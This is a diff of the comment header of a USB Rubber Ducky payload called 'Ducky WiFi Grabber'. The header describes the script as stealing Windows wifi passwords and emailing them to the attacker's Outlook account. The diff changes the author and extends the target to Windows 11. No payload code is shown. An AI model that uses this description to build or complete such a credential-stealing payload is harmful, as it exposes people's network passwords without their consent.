@@ -1,10 +1,10 @@
 REM Title:         Ducky WiFi Grabber
 REM Description:   Steals wifi passwords and sends them to your outlook email
-REM Author:        Zero_Sploit
-REM Props:         Hak5 Team
+REM Author:        Hunter Hud
+REM Props:         
 REM Version:       1.0
 REM Category:      Exfiltration
-REM Target:        Windows 10 (CMD + Powershell)
+REM Target:        Windows 11/10 (CMD + Powershell)
 REM Attackmodes:   HID
 REM Some editing on your part is needed such as outlook email & password
 REM This script is for educational purposes only please do not use this for malicious purposes
